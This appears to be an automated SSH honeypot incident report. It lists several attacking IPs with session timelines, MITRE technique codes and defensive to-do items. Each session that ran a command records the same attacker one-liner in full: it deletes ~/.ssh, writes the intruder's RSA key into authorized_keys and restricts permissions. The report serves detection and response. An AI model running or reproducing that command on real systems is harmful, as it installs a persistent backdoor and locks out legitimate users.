| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:29 |
| **Last Seen** | 2026-04-10 14:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:29:39` | `cowrie.session.connect` |
| `2026-04-10 14:29:39` | `cowrie.client.version` |
| `2026-04-10 14:29:39` | `cowrie.client.kex` |
| `2026-04-10 14:29:40` | `cowrie.login.success` |
| `2026-04-10 14:29:40` | `cowrie.session.params` |
| `2026-04-10 14:29:40` | `cowrie.command.input` |
| `2026-04-10 14:29:40` | `cowrie.command.failed` |
| `2026-04-10 14:29:40` | `cowrie.log.closed` |
| `2026-04-10 14:29:40` | `cowrie.session.params` |
| `2026-04-10 14:29:40` | `cowrie.command.input` |
| `2026-04-10 14:29:41` | `cowrie.session.file_download` |
| `2026-04-10 14:29:41` | `cowrie.log.closed` |
| `2026-04-10 14:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d5d19741d7

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:29 |
| **Last Seen** | 2026-04-10 14:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:29:43` | `cowrie.session.connect` |
| `2026-04-10 14:29:43` | `cowrie.client.version` |
| `2026-04-10 14:29:43` | `cowrie.client.kex` |
| `2026-04-10 14:29:43` | `cowrie.login.success` |
| `2026-04-10 14:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee048e5a0171

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:30 |
| **Last Seen** | 2026-04-10 14:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:30:29` | `cowrie.session.connect` |
| `2026-04-10 14:30:29` | `cowrie.client.version` |
| `2026-04-10 14:30:29` | `cowrie.client.kex` |
| `2026-04-10 14:30:29` | `cowrie.login.success` |
| `2026-04-10 14:30:30` | `cowrie.session.params` |
| `2026-04-10 14:30:30` | `cowrie.command.input` |
| `2026-04-10 14:30:30` | `cowrie.command.failed` |
| `2026-04-10 14:30:30` | `cowrie.log.closed` |
| `2026-04-10 14:30:30` | `cowrie.session.params` |
| `2026-04-10 14:30:30` | `cowrie.command.input` |
| `2026-04-10 14:30:30` | `cowrie.session.file_download` |
| `2026-04-10 14:30:30` | `cowrie.log.closed` |
| `2026-04-10 14:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b749bd8341

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:30 |
| **Last Seen** | 2026-04-10 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:30:31` | `cowrie.session.connect` |
| `2026-04-10 14:30:31` | `cowrie.client.version` |
| `2026-04-10 14:30:31` | `cowrie.client.kex` |
| `2026-04-10 14:30:31` | `cowrie.login.success` |
| `2026-04-10 14:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c965af5c93

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:31 |
| **Last Seen** | 2026-04-10 14:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:31:33` | `cowrie.session.connect` |
| `2026-04-10 14:31:33` | `cowrie.client.version` |
| `2026-04-10 14:31:34` | `cowrie.client.kex` |
| `2026-04-10 14:31:34` | `cowrie.login.success` |
| `2026-04-10 14:31:34` | `cowrie.session.params` |
| `2026-04-10 14:31:34` | `cowrie.command.input` |
| `2026-04-10 14:31:34` | `cowrie.command.failed` |
| `2026-04-10 14:31:34` | `cowrie.log.closed` |
| `2026-04-10 14:31:34` | `cowrie.session.params` |
| `2026-04-10 14:31:34` | `cowrie.command.input` |
| `2026-04-10 14:31:34` | `cowrie.session.file_download` |
| `2026-04-10 14:31:34` | `cowrie.log.closed` |
| `2026-04-10 14:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd7e465531c

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:31 |
| **Last Seen** | 2026-04-10 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:31:36` | `cowrie.session.connect` |
| `2026-04-10 14:31:36` | `cowrie.client.version` |
| `2026-04-10 14:31:36` | `cowrie.client.kex` |
| `2026-04-10 14:31:37` | `cowrie.login.success` |
| `2026-04-10 14:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a980d8bdf49b

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:33 |
| **Last Seen** | 2026-04-10 14:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:33:05` | `cowrie.session.connect` |
| `2026-04-10 14:33:05` | `cowrie.client.version` |
| `2026-04-10 14:33:05` | `cowrie.client.kex` |
| `2026-04-10 14:33:06` | `cowrie.login.success` |
| `2026-04-10 14:33:06` | `cowrie.session.params` |
| `2026-04-10 14:33:06` | `cowrie.command.input` |
| `2026-04-10 14:33:06` | `cowrie.command.failed` |
| `2026-04-10 14:33:06` | `cowrie.log.closed` |
| `2026-04-10 14:33:07` | `cowrie.session.params` |
| `2026-04-10 14:33:07` | `cowrie.command.input` |
| `2026-04-10 14:33:07` | `cowrie.session.file_download` |
| `2026-04-10 14:33:07` | `cowrie.log.closed` |
| `2026-04-10 14:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7cf74298205

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:33 |
| **Last Seen** | 2026-04-10 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:33:09` | `cowrie.session.connect` |
| `2026-04-10 14:33:09` | `cowrie.client.version` |
| `2026-04-10 14:33:09` | `cowrie.client.kex` |
| `2026-04-10 14:33:10` | `cowrie.login.success` |
| `2026-04-10 14:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ddb6f5d659

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:33 |
| **Last Seen** | 2026-04-10 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:33:52` | `cowrie.session.connect` |
| `2026-04-10 14:33:52` | `cowrie.client.version` |
| `2026-04-10 14:33:52` | `cowrie.client.kex` |
| `2026-04-10 14:33:53` | `cowrie.login.success` |
| `2026-04-10 14:33:53` | `cowrie.session.params` |
| `2026-04-10 14:33:53` | `cowrie.command.input` |
| `2026-04-10 14:33:53` | `cowrie.command.failed` |
| `2026-04-10 14:33:53` | `cowrie.log.closed` |
| `2026-04-10 14:33:53` | `cowrie.session.params` |
| `2026-04-10 14:33:53` | `cowrie.command.input` |
| `2026-04-10 14:33:53` | `cowrie.session.file_download` |
| `2026-04-10 14:33:53` | `cowrie.log.closed` |
| `2026-04-10 14:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4de625dfa9

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:33 |
| **Last Seen** | 2026-04-10 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:33:54` | `cowrie.session.connect` |
| `2026-04-10 14:33:54` | `cowrie.client.version` |
| `2026-04-10 14:33:54` | `cowrie.client.kex` |
| `2026-04-10 14:33:54` | `cowrie.login.success` |
| `2026-04-10 14:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec35248da3ad

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:35 |
| **Last Seen** | 2026-04-10 14:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:35:30` | `cowrie.session.connect` |
| `2026-04-10 14:35:30` | `cowrie.client.version` |
| `2026-04-10 14:35:30` | `cowrie.client.kex` |
| `2026-04-10 14:35:30` | `cowrie.login.success` |
| `2026-04-10 14:35:31` | `cowrie.session.params` |
| `2026-04-10 14:35:31` | `cowrie.command.input` |
| `2026-04-10 14:35:31` | `cowrie.command.failed` |
| `2026-04-10 14:35:31` | `cowrie.log.closed` |
| `2026-04-10 14:35:31` | `cowrie.session.params` |
| `2026-04-10 14:35:31` | `cowrie.command.input` |
| `2026-04-10 14:35:31` | `cowrie.session.file_download` |
| `2026-04-10 14:35:31` | `cowrie.log.closed` |
| `2026-04-10 14:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dacf1bf0360

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:35 |
| **Last Seen** | 2026-04-10 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:35:33` | `cowrie.session.connect` |
| `2026-04-10 14:35:33` | `cowrie.client.version` |
| `2026-04-10 14:35:33` | `cowrie.client.kex` |
| `2026-04-10 14:35:33` | `cowrie.login.success` |
| `2026-04-10 14:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489843844788

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:40 |
| **Last Seen** | 2026-04-10 14:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:40:09` | `cowrie.session.connect` |
| `2026-04-10 14:40:09` | `cowrie.client.version` |
| `2026-04-10 14:40:09` | `cowrie.client.kex` |
| `2026-04-10 14:40:11` | `cowrie.login.success` |
| `2026-04-10 14:40:11` | `cowrie.session.params` |
| `2026-04-10 14:40:11` | `cowrie.command.input` |
| `2026-04-10 14:40:11` | `cowrie.command.failed` |
| `2026-04-10 14:40:12` | `cowrie.log.closed` |
| `2026-04-10 14:40:12` | `cowrie.session.params` |
| `2026-04-10 14:40:12` | `cowrie.command.input` |
| `2026-04-10 14:40:13` | `cowrie.session.file_download` |
| `2026-04-10 14:40:13` | `cowrie.log.closed` |
| `2026-04-10 14:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac799bab7979

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:40 |
| **Last Seen** | 2026-04-10 14:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:40:17` | `cowrie.session.connect` |
| `2026-04-10 14:40:17` | `cowrie.client.version` |
| `2026-04-10 14:40:17` | `cowrie.client.kex` |
| `2026-04-10 14:40:18` | `cowrie.login.success` |
| `2026-04-10 14:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c85fc9ced754

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:41 |
| **Last Seen** | 2026-04-10 14:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:41:29` | `cowrie.session.connect` |
| `2026-04-10 14:41:29` | `cowrie.client.version` |
| `2026-04-10 14:41:29` | `cowrie.client.kex` |
| `2026-04-10 14:41:29` | `cowrie.login.success` |
| `2026-04-10 14:41:29` | `cowrie.session.params` |
| `2026-04-10 14:41:29` | `cowrie.command.input` |
| `2026-04-10 14:41:29` | `cowrie.command.failed` |
| `2026-04-10 14:41:29` | `cowrie.log.closed` |
| `2026-04-10 14:41:30` | `cowrie.session.params` |
| `2026-04-10 14:41:30` | `cowrie.command.input` |
| `2026-04-10 14:41:30` | `cowrie.session.file_download` |
| `2026-04-10 14:41:30` | `cowrie.log.closed` |
| `2026-04-10 14:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f787c2bbb73c

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:41 |
| **Last Seen** | 2026-04-10 14:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:41:32` | `cowrie.session.connect` |
| `2026-04-10 14:41:32` | `cowrie.client.version` |
| `2026-04-10 14:41:32` | `cowrie.client.kex` |
| `2026-04-10 14:41:32` | `cowrie.login.success` |
| `2026-04-10 14:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.91.246[.]101` | **25** | 2026-04-10 13:50 | 2026-04-10 14:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.239.84[.]249` | **25** | 2026-04-10 13:50 | 2026-04-10 14:41 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.219.22[.]213` | **25** | 2026-04-10 13:48 | 2026-04-10 14:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.143[.]203` | **24** | 2026-04-10 13:05 | 2026-04-10 13:23 | 35m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.13.182[.]13` | **23** | 2026-04-10 13:53 | 2026-04-10 14:05 | 11m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.1.107[.]37` | **23** | 2026-04-10 13:47 | 2026-04-10 13:52 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `111.228.6[.]161` | **4** | 2026-04-10 14:36 | 2026-04-10 14:44 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.57.170[.]71` | **4** | 2026-04-10 14:35 | 2026-04-10 14:44 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `20.83.167[.]28` | **2** | 2026-04-10 14:30 | 2026-04-10 14:30 | 0m | 0 | `T1592` | 🟢 LOW |
